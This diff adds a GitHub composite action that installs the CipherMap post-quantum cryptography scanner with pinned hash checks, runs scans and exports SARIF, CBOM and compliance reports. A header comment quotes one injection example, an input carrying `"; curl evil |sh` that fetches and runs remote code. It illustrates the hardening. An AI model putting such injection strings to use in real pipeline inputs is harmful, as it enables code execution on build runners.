@@ -1,0 +1,356 @@
+# CipherMap PQC scan — composite GitHub Action.
+#
+# Replaces the 12-line install/scan/upload block in every workflow with:
+#
+#   - uses: ./action  # vendored candidate; use a public immutable SHA after publication
+#     with:
+#       fail-on: high
+#
+# Requires `security-events: write` in the job's permissions when
+# upload-sarif is on (the default).
+#
+# Inputs reach the shell through env, never by interpolating ${{ }} into a
+# run: script — an input containing `"; curl evil |sh` must arrive as data,
+# not become code.
+name: "CipherMap PQC Scan"
+description: "Scan for quantum-vulnerable cryptography, gate the build, and upload SARIF to code scanning"
+branding:
+  icon: "shield"
+  color: "purple"
+
+inputs:
+  fail-on:
+    description: "Severity that fails the build: info, low, medium, high, critical, none"
+    required: false
+    default: "high"
+  target:
+    description: "Compliance profile (cnsa-2.0, fips-140-3, nist-sp-800-56b). Requires a license."
+    required: false
+    default: ""
+  license-key:
+    description: "CipherMap license key for paid profiles. Pass a secret, never a literal."
+    required: false
+    default: ""
+  sarif-file:
+    description: "Where to write the SARIF report"
+    required: false
+    default: "ciphermap.sarif"
+  upload-sarif:
+    description: "Upload the SARIF to GitHub code scanning (needs security-events: write)"
+    required: false
+    default: "true"
+  cli-version:
+    description: "Exact CipherMap CLI version expected from the pinned installer"
+    required: false
+    default: "v1.0.5"
+  installer-sha256:
+    description: "SHA-256 of install.sh for the pinned CLI release"
+    required: false
+    default: "969d30c024886cba29dc525ae3a69d480d324c5f18a60272a49c8d5d83b02e96"
+  args:
+    description: "Extra whitespace-delimited scan arguments; use configuration for values containing spaces"
+    required: false
+    default: ""
+  cbom-file:
+    description: "Optional output path for a CycloneDX CBOM (requires Tier A+ license)"
+    required: false
+    default: ""
+  cbom-spec-version:
+    description: "CycloneDX CBOM specification version when cbom-file is set (1.6 or 1.7)"
+    required: false
+    default: "1.7"
+  cbom-html-file:
+    description: "Optional output path for the zero-backend interactive HTML CBOM Explorer alongside cbom-file"
+    required: false
+    default: ""
+  attest-slsa:
+    description: "Emit a Hybrid PQC (Ed25519 + ML-DSA-65) SLSA v1.1 DSSE provenance envelope alongside cbom-file (requires pqc-device-key)"
+    required: false
+    default: "false"
+  pqc-device-key:
+    description: "Path to composite Ed25519 + ML-DSA-65 seed JSON file for attest-slsa"
+    required: false
+    default: ""
+  compliance-framework:
+    description: "Optional compliance working paper (all, crosswalk, omb-m-26-15, nist-ir-8547, eu-dora, eu-cra, pci-dss-4, cmmc, bsi-tr-02102, omb-m-23-02, oscal, squad-plan, hipaa, fedramp, nydfs-500, fda-524b, iec-62443, soc2, cnsa-2.0, fs-isac)"
+    required: false
+    default: ""
+  compliance-output:
+    description: "Output path for compliance-framework report (defaults to ciphermap-<framework>.json)"
+    required: false
+    default: ""
+  wrapper-target:
+    description: "Optional zero-code PQC edge wrapper target to generate (auto, nginx, envoy, haproxy, k8s-sidecar, ipsec, cert-manager, cnsa-2.0)"
+    required: false
+    default: ""
+  wrapper-output-dir:
+    description: "External output directory for wrapper-target artifacts"
+    required: false
+    default: ""
+  include-archives:
+    description: "Inspect packaged archives (.jar, .war, .ear, .whl, .apk, .aab, .nupkg, .zip) during scan"
+    required: false
+    default: "false"
+  baseline-file:
+    description: "Optional path to a previous CipherMap JSON scan summary to gate PRs on PQC regressions or new findings"
+    required: false
+    default: ""
+  vendor-sla:
+    description: "Emit a Third-Party Vendor PQC SLA procurement scorecard (ciphermap-vendor-sla.json) and fail if REJECTED"
+    required: false
+    default: "false"
+
+outputs:
+  sarif-file:
+    description: "Path of the SARIF report the scan wrote"
+    value: ${{ inputs.sarif-file }}
+  cbom-file:
+    description: "Path of the CycloneDX CBOM when cbom-file was requested"
+    value: ${{ inputs.cbom-file }}
+  cbom-html-file:
+    description: "Path of the interactive HTML CBOM Explorer when cbom-html-file was requested"
+    value: ${{ inputs.cbom-html-file }}
+  drift-file:
+    description: "Path of the continuous PQC drift report when baseline-file was provided"
+    value: "ciphermap-drift.json"
+  vendor-sla-file:
+    description: "Path of the Third-Party Vendor PQC SLA scorecard when vendor-sla was enabled"
+    value: "ciphermap-vendor-sla.json"
+  wrapper-output-dir:
+    description: "Directory where zero-code PQC edge wrapper artifacts were written when wrapper-target was set"
+    value: ${{ inputs.wrapper-output-dir }}
+
+runs:
+  using: "composite"
+  steps:
+    - name: Install CipherMap
+      shell: bash
+      env:
+        CM_CLI_VERSION: ${{ inputs.cli-version }}
+        CM_INSTALLER_SHA256: ${{ inputs.installer-sha256 }}
+        CM_LICENSE_KEY: ${{ inputs.license-key }}
+      run: |
+        set -euo pipefail
+        [[ "${CM_CLI_VERSION}" =~ ^v(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)(-[0-9A-Za-z.-]+)?$ ]] || {
+          echo "Invalid pinned CipherMap version: ${CM_CLI_VERSION}" >&2
+          exit 1
+        }
+        effective_license="${CM_LICENSE_KEY:-${CIPHERMAP_LICENSE:-}}"
+        if [ -n "${effective_license}" ] && [ "$(uname -s)" = "Linux" ] && [ "$(uname -m)" = "x86_64" ]; then
+          mkdir -p "${HOME}/.local/bin"
+          hdr_tmp="$(mktemp)"
+          bin_tmp="$(mktemp)"
+          trap 'rm -f "$hdr_tmp" "$bin_tmp"' EXIT
+          curl --proto '=https' --tlsv1.2 --fail --silent --show-error --max-time 60 \
+            -H "Authorization: Bearer ${effective_license}" \
+            -H "X-CipherMap-CI-Provider: github-actions" \
+            -D "$hdr_tmp" \
+            --output "$bin_tmp" \
+            "https://www.ciphermap.io/api/dl/ci-cli"
+          expected_bin_sha="$(awk 'tolower($1)=="x-ciphermap-sha256:" {gsub(/\r/,"",$2); print $2}' "$hdr_tmp")"
+          [[ "${expected_bin_sha}" =~ ^[0-9a-f]{64}$ ]] || {
+            echo "Missing X-CipherMap-SHA256 header from /api/dl/ci-cli" >&2
+            exit 1
+          }
+          echo "${expected_bin_sha}  ${bin_tmp}" | sha256sum --check --status
+          chmod 0755 "$bin_tmp"
+          mv "$bin_tmp" "${HOME}/.local/bin/ciphermap"
+        else
+          [[ "${CM_INSTALLER_SHA256}" =~ ^[0-9a-f]{64}$ ]] || {
+            echo "Invalid pinned installer SHA-256" >&2
+            exit 1
+          }
+          installer="$(mktemp)"
+          trap 'rm -f "$installer"' EXIT
+          curl --proto '=https' --tlsv1.2 --fail --silent --show-error --location --max-time 60 --output "$installer" https://www.ciphermap.io/install.sh
+          actual_installer_sha256="$(sha256sum "$installer" | awk '{print $1}')"
+          [[ "${actual_installer_sha256}" == "${CM_INSTALLER_SHA256}" ]] || {
+            echo "CipherMap ${CM_CLI_VERSION} installer digest mismatch; refusing a moving installer" >&2
+            exit 1
+          }
+          CIPHERMAP_VERSION="${CM_CLI_VERSION}" bash "$installer"
+        fi
+        # Non-root runners receive ~/.local/bin; GITHUB_PATH applies it to
+        # subsequent composite-action steps. Match install.sh's exact writable
+        # destination rule so a stale system-wide /usr/local/bin/ciphermap on a
+        # non-root runner is never preferred over the freshly installed binary.
+        echo "${HOME}/.local/bin" >> "${GITHUB_PATH}"
+        if [ -w /usr/local/bin ] && [ -x /usr/local/bin/ciphermap ]; then
+          installed_ciphermap=/usr/local/bin/ciphermap
+        elif [ -x "${HOME}/.local/bin/ciphermap" ]; then
+          installed_ciphermap="${HOME}/.local/bin/ciphermap"
+        elif [ -x /usr/local/bin/ciphermap ]; then
+          installed_ciphermap=/usr/local/bin/ciphermap
+        else
+          echo "CipherMap installer completed without publishing the expected executable" >&2
+          exit 1
+        fi
+        "${installed_ciphermap}" version | grep -F "CipherMap Version ${CM_CLI_VERSION}" >/dev/null || {
+          echo "Installed CipherMap does not match pinned version ${CM_CLI_VERSION}" >&2
+          exit 1
+        }
+        # Persist the exact path whose bytes/version were checked. A later
+        # PATH lookup could select an untrusted workspace executable instead.
+        echo "CIPHERMAP_EXECUTABLE=${installed_ciphermap}" >> "${GITHUB_ENV}"
+
+    - name: Scan
+      id: scan
+      shell: bash
+      env:
+        CM_FAIL_ON: ${{ inputs.fail-on }}
+        CM_TARGET: ${{ inputs.target }}
+        CM_SARIF_FILE: ${{ inputs.sarif-file }}
+        CM_INCLUDE_ARCHIVES: ${{ inputs.include-archives }}
+        CM_EXTRA_ARGS: ${{ inputs.args }}
+        # Deliberately NOT set to an empty string when the input is absent: a
+        # step-level env var overrides a job-level one even when empty, so
+        # naming it unconditionally would erase a CIPHERMAP_LICENSE the
+        # workflow had already exported and silently drop the caller to the
+        # free tier. The scan reads CIPHERMAP_LICENSE from the environment it
+        # inherits; the input only has to fill it in when given.
+        CM_LICENSE_KEY: ${{ inputs.license-key }}
+      run: |
+        set -euo pipefail
+        if [ -n "${CM_LICENSE_KEY}" ]; then
+          export CIPHERMAP_LICENSE="${CM_LICENSE_KEY}"
+        fi
+        args=(scan . --offline --no-telemetry --fail-on "${CM_FAIL_ON}" --format sarif -o "${CM_SARIF_FILE}")
+        if [ -n "${CM_TARGET}" ]; then
+          args+=(--target "${CM_TARGET}")
+        fi
+        if [ "${CM_INCLUDE_ARCHIVES}" = "true" ]; then
+          args+=(--include-archives)
+        fi
+        # Convert the documented whitespace-delimited escape hatch into an
+        # array. Quoted array expansion prevents repository filenames from
+        # turning '*' or '?' into extra CLI arguments. Complex arguments that
+        # contain spaces should use a checked-in CipherMap configuration.
+        extra_args=()
+        if [ -n "${CM_EXTRA_ARGS}" ]; then
+          normalized_extra="${CM_EXTRA_ARGS//$'\r'/}"
+          normalized_extra="${normalized_extra//$'\n'/ }"
+          read -r -a extra_args <<< "${normalized_extra}"
+        fi
+        rm -f -- "${CM_SARIF_FILE}"
+        echo "invoked=true" >> "${GITHUB_OUTPUT}"
+        "${CIPHERMAP_EXECUTABLE}" "${args[@]}" "${extra_args[@]}"
+
+    - name: Check the SARIF report exists
+      if: ${{ always() && inputs.upload-sarif == 'true' && steps.scan.outputs.invoked == 'true' }}
+      id: sarif
+      shell: bash
+      env:
+        CM_SARIF_FILE: ${{ inputs.sarif-file }}
+      run: |
+        # A scan that could not run wrote no report. Uploading a missing file
+        # reports an upload problem and hides the real one.
+        if [ -s "${CM_SARIF_FILE}" ]; then
+          echo "exists=true" >> "${GITHUB_OUTPUT}"
+        else
+          echo "exists=false" >> "${GITHUB_OUTPUT}"
+          echo "::warning::No SARIF report at ${CM_SARIF_FILE}; skipping the code-scanning upload."
+        fi
+
+    - name: Upload SARIF to code scanning
+      # always(): the upload must happen precisely when the gate above failed
+      # the step — that is when the findings matter most.
+      if: ${{ always() && inputs.upload-sarif == 'true' && steps.scan.outputs.invoked == 'true' && steps.sarif.outputs.exists == 'true' }}
+      uses: github/codeql-action/upload-sarif@f205ea1c3313d32999d8d6a48b4f6530d4437b38 # v4.37.4
+      with:
+        sarif_file: ${{ inputs.sarif-file }}
+
+    - name: Export CBOM and compliance evidence
+      if: ${{ !cancelled() && steps.scan.outputs.invoked == 'true' && (inputs.cbom-file != '' || inputs.compliance-framework != '' || inputs.baseline-file != '' || inputs.vendor-sla == 'true' || inputs.wrapper-target != '') }}
+      shell: bash
+      env:
+        CM_CBOM_FILE: ${{ inputs.cbom-file }}
+        CM_CBOM_SPEC_VERSION: ${{ inputs.cbom-spec-version }}
+        CM_CBOM_HTML_FILE: ${{ inputs.cbom-html-file }}
+        CM_ATTEST_SLSA: ${{ inputs.attest-slsa }}
+        CM_PQC_DEVICE_KEY: ${{ inputs.pqc-device-key }}
+        CM_COMPLIANCE_FRAMEWORK: ${{ inputs.compliance-framework }}
+        CM_COMPLIANCE_OUTPUT: ${{ inputs.compliance-output }}
+        CM_WRAPPER_TARGET: ${{ inputs.wrapper-target }}
+        CM_WRAPPER_OUT_DIR: ${{ inputs.wrapper-output-dir }}
+        CM_BASELINE_FILE: ${{ inputs.baseline-file }}
+        CM_VENDOR_SLA: ${{ inputs.vendor-sla }}
+        CM_INCLUDE_ARCHIVES: ${{ inputs.include-archives }}
+        CM_LICENSE_KEY: ${{ inputs.license-key }}
+      run: |
+        set -euo pipefail
+        if [ -n "${CM_LICENSE_KEY}" ]; then
+          export CIPHERMAP_LICENSE="${CM_LICENSE_KEY}"
+        fi
+        if [ -n "${CM_CBOM_FILE}" ]; then
+          [[ "${CM_CBOM_SPEC_VERSION}" =~ ^(1\.6|1\.7)$ ]] || {
+            echo "Invalid cbom-spec-version: ${CM_CBOM_SPEC_VERSION} (expected 1.6 or 1.7)" >&2
+            exit 1
+          }
+          cbom_args=(cbom . --spec-version "${CM_CBOM_SPEC_VERSION}" -o "${CM_CBOM_FILE}" --offline --no-telemetry)
+          if [ -n "${CM_CBOM_HTML_FILE}" ]; then
+            cbom_args+=(--html "${CM_CBOM_HTML_FILE}")
+          fi
+          if [ "${CM_INCLUDE_ARCHIVES}" = "true" ]; then
+            cbom_args+=(--include-archives)
+          fi
+          if [ "${CM_ATTEST_SLSA}" = "true" ]; then
+            [ -n "${CM_PQC_DEVICE_KEY}" ] || {
+              echo "attest-slsa requires pqc-device-key pointing to a composite Ed25519 + ML-DSA-65 seed JSON file" >&2
+              exit 1
+            }
+            cbom_args+=(--attest-slsa "${CM_CBOM_FILE}.slsa.json" --pqc-device-key "${CM_PQC_DEVICE_KEY}")
+          fi
+          "${CIPHERMAP_EXECUTABLE}" "${cbom_args[@]}"
+        fi
+        if [ -n "${CM_COMPLIANCE_FRAMEWORK}" ]; then
+          [[ "${CM_COMPLIANCE_FRAMEWORK}" =~ ^(all|crosswalk|omb-m-26-15|nist-ir-8547|eu-dora|eu-cra|pci-dss-4|cmmc|bsi-tr-02102|omb-m-23-02|oscal|squad-plan|hipaa|fedramp|nydfs-500|fda-524b|iec-62443|soc2|cnsa-2\.0|fs-isac)$ ]] || {
+            echo "Unsupported compliance-framework: ${CM_COMPLIANCE_FRAMEWORK}" >&2
+            exit 1
+          }
+          out_path="${CM_COMPLIANCE_OUTPUT}"
+          if [ -z "${out_path}" ]; then
+            out_path="ciphermap-${CM_COMPLIANCE_FRAMEWORK}.json"
+          fi
+          comp_args=(report . --framework "${CM_COMPLIANCE_FRAMEWORK}" -o "${out_path}" --offline --no-telemetry)
+          if [ "${CM_INCLUDE_ARCHIVES}" = "true" ]; then
+            comp_args+=(--include-archives)
+          fi
+          "${CIPHERMAP_EXECUTABLE}" "${comp_args[@]}"
+        fi
+        if [ -n "${CM_WRAPPER_TARGET}" ]; then
+          [[ "${CM_WRAPPER_TARGET}" =~ ^(auto|nginx|envoy|haproxy|k8s-sidecar|ipsec|cert-manager|cnsa-2\.0)$ ]] || {
+            echo "Unsupported wrapper-target: ${CM_WRAPPER_TARGET}" >&2
+            exit 1
+          }
+          wrap_args=(fix . --wrapper "${CM_WRAPPER_TARGET}" --offline --no-telemetry)
+          if [ -n "${CM_WRAPPER_OUT_DIR}" ]; then
+            wrap_args+=(-o "${CM_WRAPPER_OUT_DIR}")
+          fi
+          "${CIPHERMAP_EXECUTABLE}" "${wrap_args[@]}"
+        fi
+        gate_failed=0
+        if [ -n "${CM_BASELINE_FILE}" ]; then
+          drift_args=(report . --baseline "${CM_BASELINE_FILE}" -o "ciphermap-drift.json" --offline --no-telemetry)
+          if [ "${CM_INCLUDE_ARCHIVES}" = "true" ]; then
+            drift_args+=(--include-archives)
+          fi
+          "${CIPHERMAP_EXECUTABLE}" "${drift_args[@]}"
+          if grep -q '"status":[[:space:]]*"REGRESSED"' "ciphermap-drift.json"; then
+            echo "::error::CipherMap Continuous PQC Drift Gate failed (status=REGRESSED in ciphermap-drift.json)" >&2
+            gate_failed=1
+          fi
+        fi
+        if [ "${CM_VENDOR_SLA}" = "true" ]; then
+          vendor_args=(report . --vendor-sla -o "ciphermap-vendor-sla.json" --offline --no-telemetry)
+          if [ "${CM_INCLUDE_ARCHIVES}" = "true" ]; then
+            vendor_args+=(--include-archives)
+          fi
+          "${CIPHERMAP_EXECUTABLE}" "${vendor_args[@]}"
+          if grep -q '"status":[[:space:]]*"REJECTED"' "ciphermap-vendor-sla.json"; then
+            echo "::error::CipherMap Third-Party Vendor PQC SLA Gate failed (status=REJECTED in ciphermap-vendor-sla.json)" >&2
+            gate_failed=1
+          fi
+        fi
+        if [ "${gate_failed}" -ne 0 ]; then
+          exit 1
+        fi
